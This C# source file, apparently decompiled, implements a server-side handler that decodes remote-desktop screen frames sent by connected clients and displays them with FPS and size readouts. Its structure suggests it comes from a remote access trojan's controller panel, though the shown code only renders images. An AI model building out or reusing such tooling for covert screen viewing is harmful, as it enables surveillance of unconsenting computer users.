using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Server.Connection;
using Server.Forms;
using Server.Helper;

namespace Server.Handle_Packet;

public class HandleRemoteDesktop
{
	public void Capture(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			FormRemoteDesktop formRemoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
			try
			{
				if (formRemoteDesktop != null)
				{
					if (formRemoteDesktop.Client == null)
					{
						formRemoteDesktop.Client = client;
						formRemoteDesktop.labelWait.Visible = false;
						formRemoteDesktop.timer1.Start();
						byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
						Bitmap bitmap = formRemoteDesktop.decoder.DecodeData(new MemoryStream(asBytes));
						formRemoteDesktop.rdSize = bitmap.Size;
						Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
					}
					byte[] asBytes2 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
					lock (formRemoteDesktop.syncPicbox)
					{
						using (MemoryStream inStream = new MemoryStream(asBytes2))
						{
							Bitmap bitmap2 = (Bitmap)(formRemoteDesktop.GetImage = formRemoteDesktop.decoder.DecodeData(inStream));
							formRemoteDesktop.rdSize = bitmap2.Size;
						}
						formRemoteDesktop.pictureBox1.Image = formRemoteDesktop.GetImage;
						formRemoteDesktop.FPS++;
						if (formRemoteDesktop.sw.ElapsedMilliseconds >= 1000)
						{
							string[] obj = new string[10] { "RemoteDesktop:", client.ID, "    FPS:", null, null, null, null, null, null, null };
							int fPS = formRemoteDesktop.FPS;
							obj[3] = fPS.ToString();
							obj[4] = "    Screen:";
							obj[5] = formRemoteDesktop.GetImage.Width.ToString();
							obj[6] = " x ";
							obj[7] = formRemoteDesktop.GetImage.Height.ToString();
							obj[8] = "    Size:";
							obj[9] = Methods.BytesToString(asBytes2.Length);
							formRemoteDesktop.Text = string.Concat(obj);
							formRemoteDesktop.FPS = 0;
							formRemoteDesktop.sw = Stopwatch.StartNew();
						}
						return;
					}
				}
				client.Disconnected();
			}
			catch (Exception)
			{
			}
		}
		catch
		{
		}
	}
}
